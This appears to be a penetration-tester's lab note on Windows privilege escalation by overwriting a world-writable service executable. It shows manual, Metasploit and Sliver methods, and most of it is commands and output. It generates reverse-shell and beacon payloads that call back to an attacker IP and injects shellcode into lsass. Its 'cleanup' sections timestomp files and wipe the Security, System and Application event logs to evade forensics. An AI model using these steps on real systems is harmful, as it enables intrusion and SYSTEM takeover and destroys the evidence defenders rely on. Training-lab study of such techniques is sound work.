# Insecure Service Executable

## 01 - Manual

Weak service permissions that contains a binary file can be overwritten with a malware to gain SYSTEM privileges.

### 1.1 - Detect

#### 1.1.1 - Command Prompt

**BUILTIN\\Users** are able to change the file configuration when running `icacls.exe`

```
C:\> sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\> icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe Everyone:(F)
                                                              NT AUTHORITY\SYSTEM:(F)
                                                              BUILTIN\Administrators:(F)
                                                              WIN-QBA94KB3IOF\Administrator:(F)
                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                              BUILTIN\Administrators:(I)(F)
                                                              BUILTIN\Users:(I)(RX)
                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

To verify even further with `accesschk.exe` it is possible.

```
C:\> accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

#### 1.1.2 - Powershell

When running `Get-ACL` cmdlet that the **BUILTIN\\Users** are able to change the file configuration when running `icacls.exe`

```
PS C:\> get-acl "C:\Program Files\File Permissions Service\filepermservice.exe" | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\File Permissions Service\filepermservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : Everyone Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         WIN-QBA94KB3IOF\Administrator Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;LA)(A;ID;F
         A;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)

PS C:\> $acl = get-acl "C:\Program Files\File Permissions Service\filepermservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
Everyone: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
WIN-QBA94KB3IOF\Administrator: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

### 1.2 - Exploit

Before we overwrite the program we must first make a backup in case if it fails to start and also revert back to the original changes to clear our trace ahead of time. Then you can proceed to copy the shell to start a handler.

`$ sudo nc -lnvp 53`

- In command prompt

```
C:\> copy "c:\program files\file permissions service\filepermservice.exe" c:\temp\filepermservice.bak

C:\> copy /y shell.exe "c:\program files\file permissions service\filepermservice.exe"
        1 file(s) copied.

C:\> net start filepermsvc
```

- In powershell

```
PS C:\> copy-item "c:\program files\file permissions service\filepermservice.exe" c:\temp\filepermservice.bak

PS C:\> copy-item shell.exe "c:\program files\file permissions service\filepermservice.exe"

PS C:\> Start-Service filepermsvc
```

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.57.86.
Ncat: Connection from 10.10.57.86:49820.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 1.3 - Cleanup

Now let's copy the original binary back to it's destination path to clear any malware we've inserted it

- In command prompt

`C:\Windows\system32> copy /y c:\temp\filepermservice.bak "c:\program files\file permissions service\filepermservice.exe"`

- In powershell

`PS C:\> copy-item c:\temp\filepermservice.bak "c:\program files\file permissions service\filepermservice.exe"`

## 02 - Metasploit

### 2.1 - Detect

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > shell
Process 2276 created.
Channel 14 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
filepermsvc                          "C:\Program Files\File Permissions Service\filepermservice.exe"                            LocalSystem

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query filepermsvc

Name        : filepermsvc
Display     : File Permissions Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\File Permissions Service\filepermservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\File Permissions Service\filepermservice.exe\""
Process 2880 created.
Channel 2 created.
C:\Program Files\File Permissions Service\filepermservice.exe Everyone:(F)
                                                              NT AUTHORITY\SYSTEM:(I)(F)
                                                              BUILTIN\Administrators:(I)(F)
                                                              BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### 2.2 - Exploit

Before we overwrite the program we must first make a backup in case if it fails to start and also revert back to the original changes to clear our trace ahead of time, and collect timestamp values to circumvent the forensic tools.

```
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2020-04-15 10:42:26 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2020-04-15 10:42:26 -0400
meterpreter > download "C:\Program Files\File Permissions Service\filepermservice.exe" backup
[*] Downloading: C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe
[*] Downloaded 9.00 KiB of 9.00 KiB (100.0%): C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe
[*] download   : C:\Program Files\File Permissions Service\filepermservice.exe -> /home/user/backup/filepermservice.exe

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o filepermservice.exe

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > jobs -K
Stopping all jobs...

[*] Server stopped.
msf6 exploit(multi/script/web_delivery) > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 10.8.145.108:53 
msf6 exploit(multi/script/web_delivery) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload filepermservice.exe "C:\Program Files\File Permissions Service"
[*] uploading  : /home/user/Documents/thm/winprivesc/filepermservice.exe -> C:\Program Files\File Permissions Service
[*] uploaded   : /home/user/Documents/thm/winprivesc/filepermservice.exe -> C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > service_control filepermsvc start
[+] Operation start succeeded.
[*] Sending stage (200774 bytes) to 10.10.22.1
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.22.1:49204) at 2022-05-28 08:57:12 -0400

meterpreter > sessions 2
[*] Backgrounding session 1...
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 2.3 - Cleanup

```
meterpreter > migrate -N lsass.exe
[*] Migrating from 1732 to 688...
[*] Migration completed successfully.
meterpreter > upload backup/filepermservice.exe "C:\Program Files\File Permissions Service"
[*] uploading  : /home/user/backup/filepermservice.exe -> C:\Program Files\File Permissions Service
[*] uploaded   : /home/user/backup/filepermservice.exe -> C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2022-05-28 09:59:31 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2022-05-28 09:59:31 -0400
meterpreter > timestomp -e "04/15/2020 10:42:26" "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Setting specific MACE attributes on C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > timestomp -m "04/15/2020 10:42:26" "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Setting specific MACE attributes on C:\Program Files\File Permissions Service\filepermservice.exe
meterpreter > timestomp -v "C:\Program Files\File Permissions Service\filepermservice.exe"
[*] Showing MACE attributes for C:\Program Files\File Permissions Service\filepermservice.exe
Modified      : 2020-04-15 11:42:26 -0400
Accessed      : 2020-04-15 10:42:26 -0400
Created       : 2020-04-15 10:42:26 -0400
Entry Modified: 2020-04-15 11:42:26 -0400
meterpreter > clearev
[*] Wiping 912 records from Application...
[*] Wiping 2487 records from System...
[*] Wiping 798 records from Security...
```

## 03 - Sliver

### 3.1 - Detect

```
sliver (HOT_MANTEL) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon HOT_MANTEL (4a82d783)

[+] HOT_MANTEL completed task 4a82d783

sliver (HOT_MANTEL) > sharpup audit ModifiableServiceBinaries

[*] Tasked beacon HOT_MANTEL (a3d6995f)

[+] HOT_MANTEL completed task a3d6995f

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===
        Service 'filepermsvc' (State: Stopped, StartMode: Manual) : "C:\Program Files\File Permissions Service\filepermservice.exe"



[*] Completed Privesc Checks in 0 seconds
```

### 3.2 - Exploit

Backup the original binary file to clear forensics

TODO: list the binary file to perform timestomp technique

```
Backup the original binary file to clear forensics

sliver (HOT_MANTEL) > download "C:\Program Files\File Permissions Service\filepermservice.exe" backups/filepermservice.exe

[*] Tasked beacon HOT_MANTEL (9ed7e348)

[+] HOT_MANTEL completed task 9ed7e348

[*] Wrote 9216 bytes (1 file successfully, 0 files unsuccessfully) to /home/user/backups/filepermservice.exe

sliver (HOT_MANTEL) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -a x64 -o windows -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/DIRECT_GONG.exe

sliver (HOT_MANTEL) > upload DIRECT_GONG.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon HOT_MANTEL (ec14c9bd)

[+] HOT_MANTEL completed task ec14c9bd

[*] Wrote file to C:\Program Files\File Permissions Service\filepermservice.exe

sliver (HOT_MANTEL) > execute sc start filepermsvc

[*] Tasked beacon HOT_MANTEL (ef895201)

[+] HOT_MANTEL completed task ef895201

[*] Command executed successfully

[*] Beacon 89ff6d18 DIRECT_GONG - 10.10.160.174:49298 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:32:33 EST

sliver (HOT_MANTEL) > use 89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b

[*] Active beacon DIRECT_GONG (89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b)

sliver (DIRECT_GONG) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon DIRECT_GONG (8ce40ea1)

[+] DIRECT_GONG completed task 8ce40ea1
```

### 3.3 - Cleanup

TODO: Use `chtimes` command

```
sliver (DIRECT_GONG) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon DIRECT_GONG (28bba2f6)

[+] DIRECT_GONG completed task 28bba2f6

[!] open C:\Program Files\File Permissions Service\filepermservice.exe: The process cannot access the file because it is being used by another process.

sliver (DIRECT_GONG) > ps

[*] Tasked beacon DIRECT_GONG (38d6d854)

[+] DIRECT_GONG completed task 38d6d854

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 532    524    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 580    524    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 588    572    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 628    572    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 676    580    NT AUTHORITY\SYSTEM            x86_64   services.exe
 684    580    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 696    580    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 784    676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 860    676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 932    628    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 948    676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 996    676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1020   676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1080   676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1212   676    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1368   676    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1460   676    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1488   676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1640   676    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1920   676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1944   676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1896   784    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2324   2316   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2348   2316   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2568   676    TCM-PC\user                    x86_64   taskhost.exe
 2700   1080   TCM-PC\user                    x86_64   rdpclip.exe
 2732   996    TCM-PC\user                    x86_64   dwm.exe
 2780   2720   TCM-PC\user                    x86_64   explorer.exe
 2320   676    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2064   676    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2916   2780   TCM-PC\user                    x86_64   HOT_MANTEL.exe
 1468   676    NT AUTHORITY\SYSTEM            x86_64   mscorsvw.exe
 1812   676    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1872   676    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 1816   676    NT AUTHORITY\SYSTEM            x86_64   filepermservice.exe

sliver (DIRECT_GONG) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/BLUSHING_ROUTINE.bin

sliver (DIRECT_GONG) > execute-shellcode -p 684 BLUSHING_ROUTINE.bin

[*] Tasked beacon DIRECT_GONG (3fd53ff9)

[+] DIRECT_GONG completed task 3fd53ff9

[*] Executed shellcode on target

[*] Beacon 55287128 BLUSHING_ROUTINE - 10.10.160.174:49394 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:40:04 EST

sliver (DIRECT_GONG) > beacons

 ID         Name               Tasks   Transport   Remote Address        Hostname   Username              Operating System   Locale   Last Check-In                            Next Check-In
========== ================== ======= =========== ===================== ========== ===================== ================== ======== ======================================== =======================================
 095f9a08   HOT_MANTEL         10/10   mtls        10.10.160.174:49176   TCM-PC     user                  windows/amd64      en-US    Fri Nov 18 09:39:56 EST 2022 (12s ago)   Fri Nov 18 09:40:08 EST 2022 (0s ago)
 89ff6d18   DIRECT_GONG        4/4     mtls        10.10.160.174:49348   TCM-PC     NT AUTHORITY\SYSTEM   windows/amd64      en-US    Fri Nov 18 09:40:06 EST 2022 (2s ago)    Fri Nov 18 09:40:16 EST 2022 (in 8s)
 55287128   BLUSHING_ROUTINE   0/0     mtls        10.10.160.174:49394   TCM-PC     NT AUTHORITY\SYSTEM   windows/amd64      en-US    Fri Nov 18 09:40:05 EST 2022 (3s ago)    Fri Nov 18 09:40:16 EST 2022 (in 8s)

sliver (DIRECT_GONG) > use 55287128-d91e-4007-bb12-301dffae1375

[*] Active beacon BLUSHING_ROUTINE (55287128-d91e-4007-bb12-301dffae1375)
```

Terminate previous beacons

```
sliver (BLUSHING_ROUTINE) > beacons rm

? Select a beacon: 095f9a08-1669-42b3-a54b-7f8b93e183f1  HOT_MANTEL        10.10.160.174:49176  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (095f9a08-1669-42b3-a54b-7f8b93e183f1)

sliver (BLUSHING_ROUTINE) > beacons rm

? Select a beacon: 89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b  DIRECT_GONG       10.10.160.174:49348  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b)

sliver (BLUSHING_ROUTINE) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon BLUSHING_ROUTINE (9047317b)

[+] BLUSHING_ROUTINE completed task 9047317b

[!] open C:\Program Files\File Permissions Service\filepermservice.exe: The process cannot access the file because it is being used by another process.

sliver (BLUSHING_ROUTINE) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon BLUSHING_ROUTINE (323ace34)

[*] Session 8c2074e2 BLUSHING_ROUTINE - 10.10.160.174:49416 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:41:06 EST

sliver (BLUSHING_ROUTINE) > sessions -i 8

[*] Active session BLUSHING_ROUTINE (8c2074e2)

sliver (BLUSHING_ROUTINE) > terminate 1816

[*] Process 1816 has been terminated

sliver (BLUSHING_ROUTINE) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Wrote file to C:\Program Files\File Permissions Service\filepermservice.exe
```

## References

- [Weak Service Permissions](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)